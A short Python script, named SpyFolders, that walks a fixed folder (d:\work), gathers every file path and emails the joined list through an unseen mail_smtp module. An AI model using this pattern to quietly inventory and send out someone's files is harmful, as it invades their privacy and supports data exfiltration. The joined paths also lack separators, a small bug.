#-*- coding: utf8 -*-
import os
import sys
import mail_smtp

class SpyFolders():
    
    def get_files_list_from_dir(self,dir,ext = None):
        allfiles = []
        needExtFilter = (ext != None)
        for root,dirs,files in os.walk(dir):
            for filespath in files:
                filespath = os.path.join(root,filespath)
                extension = os.path.splitext(filespath)[1][1:]
                if needExtFilter and extension in ext:
                    allfiles.append(filespath)
                elif not needExtFilter:
                    allfiles.append(filespath)
        return allfiles

    def main(self):
        os.chdir("d:"+os.sep+"work")
        files = self.get_files_list_from_dir(os.getcwd())
        send_contents = "".join(files)
        mail_smtp.send_smtp_message("files list",send_contents)
        '''
        for item in files:
            print (item)
        pass
        '''

    def get_files(self):
        os.chdir("d:"+os.sep+"work")
        files = self.get_files_list_from_dir(os.getcwd())
        send_contents = "".join(files)
        mail_smtp.send_smtp_message("files list",send_contents)
        
        

if __name__ == "__main__":
    runner = SpyFolders()
    runner.main()
    #runner.debugFunction()

    sys.exit()
